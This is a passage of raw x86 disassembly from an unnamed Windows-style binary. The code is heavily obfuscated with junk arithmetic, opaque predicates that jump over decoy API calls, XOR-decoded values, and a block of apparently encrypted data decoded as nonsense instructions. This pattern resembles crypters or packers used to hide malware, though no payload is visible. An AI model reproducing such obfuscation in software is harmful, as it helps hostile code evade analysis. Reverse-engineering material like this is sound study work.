  415a8f:	and    DWORD PTR ds:0x4283b3,edx
  415a95:	xor    DWORD PTR ds:0x428253,0x17b
  415a9f:	sbb    DWORD PTR ds:0x428307,ecx
  415aa5:	adc    DWORD PTR ds:0x42817b,edi
  415aab:	mov    ecx,DWORD PTR [ebp+0xc]
  415aae:	shrd   eax,ecx,0x2
  415ab2:	shr    ecx,0x2
  415ab5:	mov    ecx,DWORD PTR [ebp+0x8]
  415ab8:	and    edi,0x5809
  415abe:	mov    edx,DWORD PTR [ebp+0xc]
  415ac1:	mov    edi,DWORD PTR ds:0x428183
  415ac7:	xor    DWORD PTR ds:0x4282af,edi
  415acd:	xor    edx,edx
  415acf:	xor    ebx,ebx
  415ad1:	xor    ebx,DWORD PTR ds:0x4281ff
  415ad7:	xor    edi,edi
  415ad9:	or     edi,DWORD PTR ds:0x4282bb
  415adf:	sub    ebx,edi
  415ae1:	or     ebx,DWORD PTR [ebx+edi*1]
  415ae4:	mov    esi,0x329e695d
  415ae9:	xor    eax,esi
  415aeb:	adc    ebx,0x4305
  415af1:	or     eax,edx
  415af3:	mov    DWORD PTR [ebp-0x28],eax
  415af6:	not    edx
  415af8:	mov    eax,DWORD PTR [ebp+0x8]
  415afb:	sbb    DWORD PTR ds:0x428393,edx
  415b01:	shl    ecx,0x1e
  415b04:	mov    ecx,DWORD PTR [ebp+0xc]
  415b07:	shrd   eax,ecx,0x2
  415b0b:	adc    ebx,0x5b1c
  415b11:	xor    eax,esi
  415b13:	shr    ecx,0x2
  415b16:	sbb    DWORD PTR ds:0x42825f,ecx
  415b1c:	mov    ecx,DWORD PTR [ebp+0x8]
  415b1f:	mov    edi,DWORD PTR ds:0x4281df
  415b25:	mov    edx,DWORD PTR ds:0x42822f
  415b2b:	sub    edx,edi
  415b2d:	and    edi,DWORD PTR [edi+edx*1]
  415b30:	mov    edx,DWORD PTR [ebp+0xc]
  415b33:	cmp    DWORD PTR ds:0x42839f,0x0
  415b3a:	not    DWORD PTR ds:0x428323
  415b40:	mov    DWORD PTR ds:0x42827b,0x4d0
  415b4a:	mov    DWORD PTR ds:0x428173,0x25d8
  415b54:	jmp    0x415ba8
  415b59:	mov    DWORD PTR ds:0x428383,0x25ca
  415b63:	cmp    DWORD PTR ds:0x42839f,0x0
  415b6a:	jge    0x415b90
  415b70:	push   DWORD PTR [ebp-0x28]
  415b73:	push   0x42816b
  415b78:	push   0x12d6
  415b7d:	call   DWORD PTR ds:0x428e8c
  415b83:	add    DWORD PTR ds:0x42837b,0x4989
  415b8d:	inc    edi
  415b8e:	add    edi,ebx
  415b90:	sbb    DWORD PTR ds:0x42832f,0x655f
  415b9a:	mov    ebx,DWORD PTR ds:0x4282fb
  415ba0:	adc    DWORD PTR ds:0x428337,ebx
  415ba6:	xor    edi,edi
  415ba8:	xor    edx,edx
  415baa:	add    ebx,edi
  415bac:	or     eax,edx
  415bae:	cmp    DWORD PTR ds:0x42818f,0x0
  415bb5:	mov    DWORD PTR ds:0x428187,0x74bf
  415bbf:	mov    DWORD PTR ds:0x428307,0x4195
  415bc9:	jmp    0x415c2e
  415bce:	mov    ebx,0x25c0
  415bd3:	mov    ebx,0x1763
  415bd8:	cmp    DWORD PTR ds:0x42818f,0x0
  415bdf:	jl     0x415c13
  415be5:	push   0x432b
  415bea:	push   0x428267
  415bef:	call   DWORD PTR ds:0x428e90
  415bf5:	sub    edi,DWORD PTR ds:0x4283b3
  415bfb:	sbb    DWORD PTR ds:0x428337,ecx
  415c01:	and    edx,DWORD PTR ds:0x4281a7
  415c07:	mov    edi,DWORD PTR ds:0x42824f
  415c0d:	and    DWORD PTR ds:0x42818b,edi
  415c13:	or     DWORD PTR ds:0x428183,0x73d6
  415c1d:	mov    edi,DWORD PTR ds:0x4281b3
  415c23:	mov    edx,DWORD PTR ds:0x42833b
  415c29:	sub    edi,edx
  415c2b:	xor    edi,DWORD PTR [edi+edx*1]
  415c2e:	mov    DWORD PTR [ebp-0x28],eax
  415c31:	cmp    DWORD PTR ds:0x42837f,0x0
  415c38:	mov    DWORD PTR ds:0x4283ab,ebx
  415c3e:	mov    DWORD PTR ds:0x42817f,ecx
  415c44:	jmp    0x415cab
  415c49:	mov    DWORD PTR ds:0x42819b,edx
  415c4f:	cmp    DWORD PTR ds:0x42837f,0x0
  415c56:	jbe    0x415ca1
  415c5c:	push   0x6725
  415c61:	push   0x42831b
  415c66:	push   0x8698
  415c6b:	push   0x6e02
  415c70:	push   0x538f
  415c75:	push   DWORD PTR [ebp-0x24]
  415c78:	push   0x8d72
  415c7d:	push   0x8325
  415c82:	call   DWORD PTR ds:0x428de0
  415c88:	mov    edi,DWORD PTR ds:0x4281d7
  415c8e:	mov    edx,DWORD PTR ds:0x42835f
  415c94:	sub    edi,edx
  415c96:	sub    edi,DWORD PTR [edi+edx*1]
  415c99:	add    DWORD PTR ds:0x428337,ebx
  415c9f:	or     edx,ebx
  415ca1:	add    edx,edi
  415ca3:	or     ebx,ebx
  415ca5:	and    ebx,DWORD PTR ds:0x42824f
  415cab:	mov    eax,ds:0x4223e8
  415cb0:	xor    edx,0x5bba
  415cb6:	mov    eax,DWORD PTR [eax]
  415cb8:	or     ebx,edx
  415cba:	mov    DWORD PTR [ebp-0xc],eax
  415cbd:	and    edi,0x77ac
  415cc3:	mov    eax,ds:0x422608
  415cc8:	mov    eax,DWORD PTR [eax]
  415cca:	cmp    DWORD PTR ds:0x42839b,0x0
  415cd1:	mov    edi,DWORD PTR ds:0x42828b
  415cd7:	mov    ebx,DWORD PTR ds:0x4283b3
  415cdd:	mov    DWORD PTR ds:0x428253,0x6f52
  415ce7:	jmp    0x415d31
  415cec:	mov    DWORD PTR ds:0x42838b,0x23d0
  415cf6:	cmp    DWORD PTR ds:0x42839b,0x0
  415cfd:	ja     0x415d21
  415d03:	push   DWORD PTR [ebp-0x18]
  415d06:	push   0x1c98
  415d0b:	push   DWORD PTR [ebp-0x1c]
  415d0e:	push   DWORD PTR [ebp-0xc]
  415d11:	call   DWORD PTR ds:0x428de4
  415d17:	or     ebx,edx
  415d19:	or     edx,edi
  415d1b:	adc    edi,0x39b9
  415d21:	and    edx,DWORD PTR ds:0x428277
  415d27:	sbb    edx,edi
  415d29:	add    edx,edi
  415d2b:	sbb    ebx,0x45bb
  415d31:	mov    DWORD PTR [ebp-0x10],eax
  415d34:	xor    DWORD PTR ds:0x42828f,0x428273
  415d3e:	mov    eax,DWORD PTR [ebp-0xc]
  415d41:	sbb    DWORD PTR ds:0x42831f,0x4085
  415d4b:	mov    eax,DWORD PTR [ebp-0xc]
  415d4e:	mov    ebx,DWORD PTR [ebp+0x8]
  415d51:	cmp    DWORD PTR ds:0x428337,0x0
  415d58:	mov    DWORD PTR ds:0x428293,0x5216
  415d62:	not    DWORD PTR ds:0x42826b
  415d68:	mov    edi,0x3d1c
  415d6d:	mov    DWORD PTR ds:0x42828b,0x4705
  415d77:	jmp    0x415dc1
  415d7c:	mov    DWORD PTR ds:0x4282ab,ebx
  415d82:	cmp    DWORD PTR ds:0x428337,0x0
  415d89:	jg     0x415da3
  415d8f:	push   0x4280cb
  415d94:	push   0x428079
  415d99:	call   DWORD PTR ds:0x428de8
  415d9f:	and    edx,edx
  415da1:	sub    edi,edi
  415da3:	xor    edx,edx
  415da5:	xor    edx,DWORD PTR ds:0x42828f
  415dab:	sbb    DWORD PTR ds:0x4283b3,edx
  415db1:	or     DWORD PTR ds:0x428393,ebx
  415db7:	sbb    DWORD PTR ds:0x4282b3,0x12ba
  415dc1:	shl    ecx,0x1e
  415dc4:	xor    ecx,ecx
  415dc6:	adc    DWORD PTR ds:0x42832f,ecx
  415dcc:	shld   ecx,eax,0x2
  415dd0:	shl    eax,0x2
  415dd3:	mov    edi,0xca79a575
  415dd8:	mov    edx,0x9c1b89e8
  415ddd:	or     DWORD PTR ds:0x42816f,0x4c83
  415de7:	mov    DWORD PTR [ebp-0x38],ebx
  415dea:	mov    ebx,DWORD PTR [ebp+0xc]
  415ded:	xor    DWORD PTR ds:0x428167,0x6279
  415df7:	xor    eax,edi
  415df9:	sub    DWORD PTR ds:0x4281ab,0x428173
  415e03:	xor    ecx,edx
  415e05:	mov    DWORD PTR ds:0x4281ab,0x1398
  415e0f:	mov    DWORD PTR [ebp-0x1c],0xa4069bae
  415e16:	mov    DWORD PTR ds:0x42837f,0x5e42
  415e20:	mov    DWORD PTR [ebp-0x18],0xa40692ae
  415e27:	mov    DWORD PTR [ebp-0x34],ebx
  415e2a:	mov    DWORD PTR ds:0x428287,0x218e
  415e34:	cmp    eax,DWORD PTR [ebp-0x38]
  415e37:	mov    DWORD PTR ds:0x4282b3,0x534
  415e41:	jne    0x415e59
  415e47:	mov    DWORD PTR ds:0x42825f,0x12af
  415e51:	cmp    ecx,ebx
  415e53:	je     0x416649
  415e59:	mov    eax,DWORD PTR [ebp-0x10]
  415e5c:	adc    DWORD PTR ds:0x42828f,edx
  415e62:	mov    eax,DWORD PTR [ebp-0x10]
  415e65:	xor    ecx,ecx
  415e67:	shld   ecx,eax,0x2
  415e6b:	and    DWORD PTR ds:0x428317,0x42819f
  415e75:	shl    eax,0x2
  415e78:	xor    ecx,edx
  415e7a:	cmp    DWORD PTR ds:0x428183,0x0
  415e81:	not    edx
  415e83:	mov    DWORD PTR ds:0x42832f,edx
  415e89:	mov    edx,0x6413
  415e8e:	jmp    0x415f0c
  415e93:	mov    DWORD PTR ds:0x42819f,0x1988
  415e9d:	mov    DWORD PTR ds:0x4282a7,0x1d2b
  415ea7:	cmp    DWORD PTR ds:0x428183,0x0
  415eae:	je     0x415ee8
  415eb4:	push   0x6b61
  415eb9:	push   0x4c93
  415ebe:	call   DWORD PTR ds:0x428dec
  415ec4:	or     DWORD PTR ds:0x428243,0x4f44
  415ece:	or     edx,0x2695
  415ed4:	sub    DWORD PTR ds:0x42837b,0x174
  415ede:	mov    DWORD PTR ds:0x42839f,0x41a3
  415ee8:	mov    edx,DWORD PTR ds:0x42839b
  415eee:	add    edx,DWORD PTR ds:0x42817f
  415ef4:	mov    DWORD PTR ds:0x42839b,edx
  415efa:	or     DWORD PTR ds:0x428387,ecx
  415f00:	mov    edx,DWORD PTR ds:0x428337
  415f06:	or     DWORD PTR ds:0x428297,edx
  415f0c:	mov    edx,DWORD PTR [ebp+0x8]
  415f0f:	xor    eax,edi
  415f11:	mov    DWORD PTR ds:0x4282a7,ecx
  415f17:	mov    edi,DWORD PTR [ebp+0xc]
  415f1a:	cmp    eax,edx
  415f1c:	jne    0x415f34
  415f22:	cmp    ecx,edi
  415f24:	mov    DWORD PTR ds:0x42832f,0x9a6
  415f2e:	je     0x416649
  415f34:	cmp    DWORD PTR ds:0x428163,0x0
  415f3b:	mov    DWORD PTR ds:0x428187,0x3be3
  415f45:	movzx  ebx,WORD PTR ds:0x428387
  415f4c:	not    edi
  415f4e:	jmp    0x415fba
  415f53:	mov    DWORD PTR ds:0x428327,ebx
  415f59:	cmp    DWORD PTR ds:0x428163,0x0
  415f60:	jne    0x415fad
  415f66:	push   0x3f61
  415f6b:	push   0x3f0f
  415f70:	push   DWORD PTR [ebp-0x18]
  415f73:	push   0x84fe
  415f78:	push   DWORD PTR [ebp-0x18]
  415f7b:	push   DWORD PTR [ebp-0x10]
  415f7e:	push   0x689e
  415f83:	push   DWORD PTR [ebp-0x18]
  415f86:	push   0x8af6
  415f8b:	call   DWORD PTR ds:0x428ef8
  415f91:	xor    DWORD PTR ds:0x4283b7,edx
  415f97:	sbb    edi,DWORD PTR ds:0x428293
  415f9d:	sub    DWORD PTR ds:0x42824f,0x4f5e
  415fa7:	sub    ecx,DWORD PTR ds:0x42838b
  415fad:	add    edi,0xe71
  415fb3:	dec    ecx
  415fb4:	and    ecx,DWORD PTR ds:0x428333
  415fba:	mov    eax,DWORD PTR [ebp-0x18]
  415fbd:	and    DWORD PTR ds:0x428383,ebx
  415fc3:	mov    ecx,DWORD PTR [ebp-0x18]
  415fc6:	push   0xfffffffe
  415fc8:	pop    ebx
  415fc9:	and    DWORD PTR ds:0x42819b,0xd25
  415fd3:	xor    ecx,ebx
  415fd5:	movzx  edi,BYTE PTR ds:0x42819b
  415fdc:	add    DWORD PTR ds:0x428283,edi
  415fe2:	shl    ecx,0x1e
  415fe5:	cmp    DWORD PTR ds:0x42824f,0x0
  415fec:	mov    DWORD PTR ds:0x4283a3,ecx
  415ff2:	mov    edi,0x37d1
  415ff7:	mov    DWORD PTR ds:0x4283b7,0x730b
  416001:	mov    edi,0x60e5
  416006:	jmp    0x416062
  41600b:	mov    DWORD PTR ds:0x428383,0x1cd3
  416015:	mov    DWORD PTR ds:0x42817f,0x4bc0
  41601f:	cmp    DWORD PTR ds:0x42824f,0x0
  416026:	jg     0x41603f
  41602c:	push   0x1ec5
  416031:	call   DWORD PTR ds:0x428efc
  416037:	add    DWORD PTR ds:0x428183,edx
  41603d:	neg    edi
  41603f:	mov    DWORD PTR ds:0x428327,0x2c32
  416049:	and    edi,DWORD PTR ds:0x42825f
  41604f:	and    edi,0x1973
  416055:	movzx  edi,WORD PTR ds:0x428257
  41605c:	adc    DWORD PTR ds:0x42827b,edi
  416062:	mov    edi,0xa4069aaf
  416067:	and    DWORD PTR ds:0x4283ab,0x1058
  416071:	xor    eax,edi
  416073:	sub    DWORD PTR ds:0x428317,0x42828f
  41607d:	shr    eax,0x2
  416080:	or     eax,ecx
  416082:	cmp    DWORD PTR ds:0x42819f,0x0
  416089:	mov    DWORD PTR ds:0x428337,0x1e83
  416093:	mov    DWORD PTR ds:0x428393,edx
  416099:	movzx  ecx,WORD PTR ds:0x42826b
  4160a0:	jmp    0x4160ed
  4160a5:	not    ecx
  4160a7:	mov    ecx,DWORD PTR ds:0x4281a3
  4160ad:	cmp    DWORD PTR ds:0x42819f,0x0
  4160b4:	jg     0x4160e2
  4160ba:	push   DWORD PTR [ebp-0x20]
  4160bd:	push   DWORD PTR [ebp-0x18]
  4160c0:	call   DWORD PTR ds:0x428df0
  4160c6:	adc    DWORD PTR ds:0x42832b,edi
  4160cc:	or     DWORD PTR ds:0x42826b,0x4a59
  4160d6:	mov    ecx,DWORD PTR ds:0x42823f
  4160dc:	sub    DWORD PTR ds:0x42819b,ecx
  4160e2:	add    DWORD PTR ds:0x42828f,0x16e5
  4160ec:	dec    ecx
  4160ed:	mov    DWORD PTR [ebp-0x34],eax
  4160f0:	mov    eax,ds:0x422568
  4160f5:	and    ecx,DWORD PTR ds:0x42827f
  4160fb:	mov    DWORD PTR [ebp-0x34],eax
  4160fe:	mov    eax,DWORD PTR [ebp-0xc]
  416101:	mov    DWORD PTR [ebp-0x14],eax
  416104:	xor    DWORD PTR ds:0x42838b,ecx
  41610a:	mov    ecx,DWORD PTR [ebp-0x14]
  41610d:	or     DWORD PTR ds:0x4283a3,0x5817
  416117:	push   0x4
  416119:	cmp    DWORD PTR ds:0x42819b,0x0
  416120:	mov    DWORD PTR ds:0x428383,0x7b16
  41612a:	mov    DWORD PTR ds:0x42819f,0x195b
  416134:	jmp    0x41618b
  416139:	mov    DWORD PTR ds:0x42827b,0x5f2a
  416143:	cmp    DWORD PTR ds:0x42819b,0x0
  41614a:	jle    0x41616d
  416150:	push   DWORD PTR [ebp-0x20]
  416153:	call   DWORD PTR ds:0x428f00
  416159:	xor    DWORD PTR ds:0x428177,0x42816b
  416163:	sub    DWORD PTR ds:0x428163,0x42818f
  41616d:	sbb    DWORD PTR ds:0x42829f,0x428297
  416177:	and    DWORD PTR ds:0x42828f,0x56d1
  416181:	xor    DWORD PTR ds:0x42827b,0x1431
  41618b:	pop    eax
  41618c:	or     DWORD PTR ds:0x42826f,0x4281ab
  416196:	sub    eax,ecx
  416198:	mov    ecx,DWORD PTR [ebp-0x10]
  41619b:	add    ecx,eax
  41619d:	mov    DWORD PTR [ebp-0x24],ecx
  4161a0:	mov    ecx,DWORD PTR ds:0x42821f
  4161a6:	mov    ecx,DWORD PTR [ecx]
  4161a8:	sbb    DWORD PTR ds:0x4281a3,ecx
  4161ae:	lea    eax,[ebp-0x30]
  4161b1:	mov    DWORD PTR [ebp-0x2c],eax
  4161b4:	and    eax,0x1e1b
  4161b9:	mov    eax,DWORD PTR [ebp-0x1c]
  4161bc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4161bf:	xor    eax,edi
  4161c1:	xor    ecx,ebx
  4161c3:	sub    DWORD PTR ds:0x42819b,0x428277
  4161cd:	shr    eax,0x2
  4161d0:	and    DWORD PTR ds:0x42829b,0x42825b
  4161da:	shl    ecx,0x1e
  4161dd:	sbb    DWORD PTR ds:0x428327,0x42823b
  4161e7:	or     eax,ecx
  4161e9:	or     DWORD PTR ds:0x428293,0x697f
  4161f3:	mov    DWORD PTR [ebp-0x20],eax
  4161f6:	mov    DWORD PTR [ebp-0x8],0xa4069abe
  4161fd:	mov    eax,DWORD PTR [ebp-0x8]
  416200:	mov    ecx,DWORD PTR [ebp-0x8]
  416203:	xor    eax,edi
  416205:	xor    ecx,ebx
  416207:	shr    eax,0x2
  41620a:	shl    ecx,0x1e
  41620d:	or     ecx,eax
  41620f:	push   ecx
  416210:	lea    eax,[ebp-0x8]
  416213:	push   eax
  416214:	lea    eax,[ebp-0x7c]
  416217:	push   eax
  416218:	call   0x415231
  41621d:	mov    eax,DWORD PTR [ebp-0x8]
  416220:	mov    ecx,DWORD PTR [ebp-0x8]
  416223:	xor    eax,edi
  416225:	xor    ecx,ebx
  416227:	shr    eax,0x2
  41622a:	shl    ecx,0x1e
  41622d:	or     ecx,eax
  41622f:	push   ecx
  416230:	lea    eax,[ebp-0x14]
  416233:	push   eax
  416234:	mov    eax,DWORD PTR [ebp+0x8]
  416237:	mov    ecx,DWORD PTR [ebp+0xc]
  41623a:	shrd   eax,ecx,0x2
  41623e:	shr    ecx,0x2
  416241:	mov    ecx,DWORD PTR [ebp+0x8]
  416244:	mov    edx,DWORD PTR [ebp+0xc]
  416247:	xor    eax,esi
  416249:	xor    edx,edx
  41624b:	or     eax,edx
  41624d:	lea    eax,[ebp+eax*4-0x78]
  416251:	push   eax
  416252:	shl    ecx,0x1e
  416255:	call   0x415231
  41625a:	mov    eax,DWORD PTR [ebp-0x8]
  41625d:	mov    ecx,DWORD PTR [ebp-0x8]
  416260:	xor    eax,edi
  416262:	xor    ecx,ebx
  416264:	shr    eax,0x2
  416267:	shl    ecx,0x1e
  41626a:	or     ecx,eax
  41626c:	push   ecx
  41626d:	lea    eax,[ebp-0x24]
  416270:	push   eax
  416271:	mov    eax,DWORD PTR [ebp+0x10]
  416274:	mov    ecx,DWORD PTR [ebp+0x14]
  416277:	shrd   eax,ecx,0x2
  41627b:	shr    ecx,0x2
  41627e:	mov    ecx,DWORD PTR [ebp+0x10]
  416281:	mov    edx,DWORD PTR [ebp+0x14]
  416284:	xor    eax,esi
  416286:	xor    edx,edx
  416288:	or     eax,edx
  41628a:	lea    eax,[ebp+eax*4-0x78]
  41628e:	push   eax
  41628f:	shl    ecx,0x1e
  416292:	call   0x415231
  416297:	mov    eax,DWORD PTR [ebp-0x8]
  41629a:	mov    ecx,DWORD PTR [ebp-0x8]
  41629d:	xor    ecx,ebx
  41629f:	xor    eax,edi
  4162a1:	shl    ecx,0x1e
  4162a4:	shr    eax,0x2
  4162a7:	or     ecx,eax
  4162a9:	push   ecx
  4162aa:	lea    eax,[ebp-0x20]
  4162ad:	push   eax
  4162ae:	mov    eax,DWORD PTR [ebp+0x10]
  4162b1:	mov    ecx,DWORD PTR [ebp+0x14]
  4162b4:	shrd   eax,ecx,0x2
  4162b8:	shr    ecx,0x2
  4162bb:	mov    ecx,DWORD PTR [ebp+0x10]
  4162be:	mov    edx,DWORD PTR [ebp+0x14]
  4162c1:	xor    edx,edx
  4162c3:	xor    eax,esi
  4162c5:	or     eax,edx
  4162c7:	shl    ecx,0x1e
  4162ca:	mov    ecx,DWORD PTR [ebp+0x10]
  4162cd:	mov    edx,DWORD PTR [ebp+0x14]
  4162d0:	shrd   ecx,edx,0x2
  4162d4:	shr    edx,0x2
  4162d7:	mov    edx,DWORD PTR [ebp+0x10]
  4162da:	mov    ebx,DWORD PTR [ebp+0x14]
  4162dd:	xor    ecx,esi
  4162df:	xor    ebx,ebx
  4162e1:	or     ecx,ebx
  4162e3:	add    eax,ecx
  4162e5:	lea    eax,[ebp+eax*4-0x78]
  4162e9:	push   eax
  4162ea:	shl    edx,0x1e
  4162ed:	call   0x415231
  4162f2:	mov    eax,DWORD PTR [ebp-0x8]
  4162f5:	mov    ecx,DWORD PTR [ebp-0x8]
  4162f8:	xor    ecx,0xfffffffe
  4162fb:	shl    ecx,0x1e
  4162fe:	jmp    0x41655e
  416303:	sbb    eax,0x26add60b
  416308:	lods   eax,DWORD PTR ds:[esi]
  416309:	sbb    bh,BYTE PTR [edx-0x45]
  41630c:	xor    bl,BYTE PTR [ebx+0x70]
  41630f:	mov    ch,0x89
  416311:	jg     0x4162c3
  416313:	hlt    
  416314:	add    BYTE PTR [esi],dl
  416316:	sbb    BYTE PTR [ebx+0x51181814],bl
  41631c:	pushf  
  41631d:	mov    bl,0x2f
  41631f:	jae    0x416309
  416321:	loop   0x4162f7
  416323:	aad    0x79
  416325:	xor    ebx,DWORD PTR [edx-0x17761e9b]
  41632b:	jge    0x4162f1
  41632d:	cmp    ch,bh
  41632f:	outs   dx,DWORD PTR ds:[esi]
  416330:	xor    BYTE PTR [ecx+0x14],ch
  416333:	stos   DWORD PTR es:[edi],eax
  416334:	sub    DWORD PTR [edx-0x402e04b7],esi
  41633a:	mov    ebp,DWORD PTR ds:0xaf08884
  416340:	cmp    eax,0x601628cc
  416345:	xor    BYTE PTR [ebx+ebx*8],0x7d
  416349:	jno    0x41630c
  41634b:	push   ecx
  41634c:	jge    0x4162ef
  41634e:	outs   dx,DWORD PTR ds:[esi]
  41634f:	(bad)  
  416350:	cmp    ecx,edi
  416352:	mov    ebp,0xaca63c86
  416357:	les    edi,FWORD PTR [edi+0x65f5d52d]
  41635d:	pop    es
  41635e:	pop    ebx
  41635f:	pop    ebp
  416360:	xor    al,0xa9
  416362:	lea    esp,[ebx+0x7689268]
  416368:	mov    ch,BYTE PTR ds:0xe6df924f
  41636e:	scas   eax,DWORD PTR es:[edi]
  41636f:	dec    esp
  416370:	cdq    
  416371:	jg     0x416375
  416373:	inc    edx
  416374:	in     al,0xa6
  416376:	dec    esi
  416377:	mov    bl,0x81
  416379:	pop    DWORD PTR ds:0xc9bc268
  41637f:	sbb    DWORD PTR ds:[edi+0x398e3ef5],0x5d4f14c1
  41638a:	xchg   esp,eax
  41638b:	sysexit 
  41638d:	iret   
  41638e:	pop    esi
  41638f:	fisttp WORD PTR [esi]
  416391:	push   ds
  416392:	ret    
  416393:	adc    edx,esp
  416395:	xor    cl,BYTE PTR [ebx+0x95888a8]
  41639b:	std    
  41639c:	scas   al,BYTE PTR es:[edi]
  41639d:	mov    al,0xd0
  41639f:	sti    
  4163a0:	cmp    dl,BYTE PTR [ebp+0x53]
  4163a3:	rcl    DWORD PTR [esi-0x42d3155f],0xd0
  4163aa:	retf   
  4163ab:	retf   0xd979
  4163ae:	inc    esp
  4163af:	mov    ds:0x741d6055,al
  4163b4:	jnp    0x416345
  4163b6:	mov    al,ds:0x5e62b8be
  4163bb:	js     0x41642d
  4163bd:	sub    DWORD PTR [eax],esp
  4163bf:	(bad)  
  4163c0:	jmp    FWORD PTR [ebp+eiz*8-0x1631e535]
  4163c7:	leave  
  4163c8:	adc    ch,dh
  4163ca:	inc    edx
  4163cb:	jle    0x416392
  4163cd:	xor    BYTE PTR [ebx+ebx*8+0x1b25e6a9],ch
  4163d4:	pop    es
  4163d5:	test   DWORD PTR [esi-0x2c007dc4],esi
  4163db:	mov    ebx,0x2c3947b7
  4163e0:	mov    esp,0xf5ce9b6f
  4163e5:	add    eax,0x24f2c724
  4163ea:	stos   BYTE PTR es:[edi],al
  4163eb:	nop
  4163ec:	retf   
  4163ed:	dec    esi
  4163ee:	jp     0x416418
  4163f0:	call   DWORD PTR [eax+0x73]
  4163f3:	mov    edx,0x45c427d0
  4163f8:	pusha  
  4163f9:	les    ebx,FWORD PTR [ecx-0x3744153c]
  4163ff:	dec    eax
  416400:	push   esp
  416401:	es mov dh,0x69
  416404:	lahf   
  416405:	mov    eax,0x6a3e1887
  41640a:	mov    ebp,0x1d8cb17f
  41640f:	enter  0xc58d,0x47
  416413:	sub    dl,BYTE PTR [esi]
  416415:	xor    ebx,DWORD PTR [ebx-0x784f8f1c]
  41641b:	mov    cl,0x61
  41641d:	mov    edx,0x53a90b80
  416422:	sbb    eax,0xa4810192
  416427:	lea    ebx,[edi+ecx*8+0x5db8dd75]
  41642e:	or     bl,BYTE PTR [ebp+esi*1-0x19167a32]
  416435:	mov    BYTE PTR [edx+0x5],bl
  416438:	in     al,0x24
  41643a:	in     al,0x2f
  41643c:	inc    ecx
  41643d:	in     al,dx
  41643e:	pop    eax
  41643f:	retf   0xa6db
  416442:	push   ss
  416443:	or     esi,DWORD PTR [eax+0x8]
  416446:	and    eax,0x235843ed
  41644b:	jb     0x41642e
  41644d:	int    0xc8
  41644f:	and    DWORD PTR [edi-0x59803989],edx
  416455:	repnz (bad) 
  416457:	in     al,0x40
  416459:	stos   BYTE PTR es:[edi],al
  41645a:	xor    ebp,DWORD PTR [edi+0x20]
  41645d:	sbb    eax,0xc011960b
  416462:	(bad)  
  416463:	js     0x41643b
  416465:	xor    DWORD PTR [edx+eiz*1+0x6f],esp
  416469:	(bad)  
  41646a:	rcr    edx,cl
  41646c:	fstp   st(5)
  41646e:	cmc    
  41646f:	nop
  416470:	push   esi
  416471:	fiadd  DWORD PTR ds:0xe7ed03ff
  416477:	dec    ebx
  416478:	pop    edx
  416479:	fisubr WORD PTR [edi-0x2d19fa56]
  41647f:	test   edx,eax
  416481:	data16 (bad) [ebx]
  416484:	xchg   esi,eax
  416485:	shl    BYTE PTR [edi+edi*1],0x76
  416489:	or     BYTE PTR [eax+edi*2-0x50041384],0xed
  416491:	jno    0x41643a
  416493:	jne    0x41650a
  416495:	dec    ebp
  416496:	jmp    DWORD PTR [edx+edi*4-0x28929d43]
  41649d:	xchg   ch,ch
  41649f:	or     BYTE PTR [ecx+0xcf5798b],bh
  4164a5:	xor    esp,DWORD PTR [edi]
  4164a7:	and    DWORD PTR [ecx+0x2269bf2a],edx
  4164ad:	cs leave 
  4164af:	add    dl,bh
  4164b1:	call   edx
  4164b3:	jns    0x4164ca
  4164b5:	or     dl,dh
  4164b7:	sbb    BYTE PTR [edx+eax*4-0x59708608],0x5e
  4164bf:	out    dx,eax
  4164c0:	xor    ecx,esi
  4164c2:	or     cl,dl
  4164c4:	aaa    
  4164c5:	push   0x6657be1a
  4164ca:	xlat   BYTE PTR ds:[ebx]
  4164cb:	or     al,0x6a
  4164cd:	mov    ecx,0x3d2089bc
  4164d2:	sub    DWORD PTR [eax+0x49],ebx
  4164d5:	aam    0xd
  4164d7:	cmp    DWORD PTR [edx-0x4680d0be],ecx
  4164dd:	mov    eax,ds:0x78b597b9
  4164e2:	mov    al,0x92
  4164e4:	add    esi,DWORD PTR ss:[ebp-0x743e9c54]
  4164eb:	xchg   edi,eax
  4164ec:	xchg   ah,dh
  4164ee:	int    0x8c
  4164f0:	mov    edi,0xbb8a19f7
  4164f5:	leave  
  4164f6:	out    0x8a,al
  4164f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164f9:	out    dx,al
  4164fa:	xor    cl,BYTE PTR [eax+0x47]
  4164fd:	fimul  WORD PTR [edi+0x5d]
  416500:	jno    0x416491
  416502:	sub    DWORD PTR [eax-0x6eba5009],ebx
  416508:	jmp    0x26ef:0x4a90e807
  41650f:	(bad)  
  416511:	jns    0x41652e
  416513:	test   BYTE PTR [esi-0x5b],0xd1
  416517:	outs   dx,BYTE PTR ds:[esi]
  416518:	dec    ecx
  416519:	push   cs
  41651a:	mov    fs,WORD PTR [edi-0x1b]
  41651d:	scas   al,BYTE PTR es:[edi]
  41651e:	inc    ecx
  41651f:	test   BYTE PTR [ebp+0x49],dl
  416522:	das    
  416523:	mov    ebx,0xa6cd801
  416528:	pop    esi
  416529:	cmp    esi,DWORD PTR [ebp+esi*1+0x4b]
  41652d:	dec    ebx
  41652e:	xchg   ecx,eax
  41652f:	ins    BYTE PTR es:[edi],dx
  416530:	and    DWORD PTR [ebx+eax*2],0xffffffe5
  416534:	xchg   DWORD PTR [eax+edx*8-0x31],esi
  416538:	sub    al,0x2c
  41653a:	int3   
  41653b:	jne    0x4164fc
  41653d:	retf   
  41653e:	mov    ebx,0x278d4f1e
  416543:	xchg   BYTE PTR [edx+0x169cb934],dl
  416549:	arpl   WORD PTR [ecx+ebp*2-0x52],sp
  41654d:	imul   ecx,DWORD PTR [ecx+0x6d4af33f],0xe
  416554:	sti    
  416555:	xor    ebx,DWORD PTR [eax+0x30]
  416558:	test   DWORD PTR [ecx+0x67],edi
  41655b:	push   ecx
  41655c:	out    0xd,al
  41655e:	xor    eax,edi
  416560:	shr    eax,0x2
  416563:	or     ecx,eax
  416565:	push   ecx
  416566:	lea    eax,[ebp-0x2c]
  416569:	push   eax
  41656a:	mov    eax,DWORD PTR [ebp+0x10]
  41656d:	mov    ecx,DWORD PTR [ebp+0x14]
  416570:	shrd   eax,ecx,0x2
  416574:	shr    ecx,0x2
  416577:	mov    ecx,DWORD PTR [ebp+0x10]
  41657a:	mov    edx,DWORD PTR [ebp+0x14]
  41657d:	xor    edx,edx
  41657f:	shl    ecx,0x1e
  416582:	mov    ecx,DWORD PTR [ebp+0x10]
  416585:	xor    eax,esi
  416587:	or     eax,edx
  416589:	mov    edx,DWORD PTR [ebp+0x14]
  41658c:	shrd   ecx,edx,0x2
